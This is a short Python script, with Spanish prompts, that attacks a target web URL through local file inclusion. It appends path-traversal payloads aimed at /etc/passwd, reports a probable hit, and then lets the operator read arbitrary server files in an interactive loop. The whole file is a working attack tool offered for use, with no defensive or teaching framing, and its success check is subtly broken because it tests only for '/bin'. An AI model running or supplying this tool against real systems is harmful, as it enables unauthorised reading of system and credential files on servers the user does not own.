#!/usr/bin/env python
#_*_ coding: utf8 _*_
import requests
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()

def main():
	payloads = ['../../../../../../../etc/passwd','/../../../etc/passwd','/etc/passwd']
	if parser.target:
		print("Objetivo => {}".format(parser.target))
		for p in payloads:
			print("\n================================================")
			print("Objetivo => {}".format(parser.target+p))
			chimichurri = requests.get(parser.target+p)
			if 'root' and 'bash' and '/bin' in chimichurri.text:
				print("LFI Probable: {}".format(parser.target+p))
				b = BeautifulSoup(chimichurri.text,'html5lib')
				print(b.blockquote.text)
				op = input("Consultar archivos?: s/n: ")
				if op.lower() == "s":
					while True:
						files = input("Archivo: ")
						qf = requests.get(parser.target+files)
						if not "Warning" in qf.text:
							bf = BeautifulSoup(qf.text,'html5lib')
							print(bf.blockquote.text)
						else:
							print("Fallo en la consulta del archivo.")

			print("\n================================================")
	else:
		print("Especifica el Objetivo! ")



if __name__ == '__main__':
	try:
		main()
	except:
		exit()
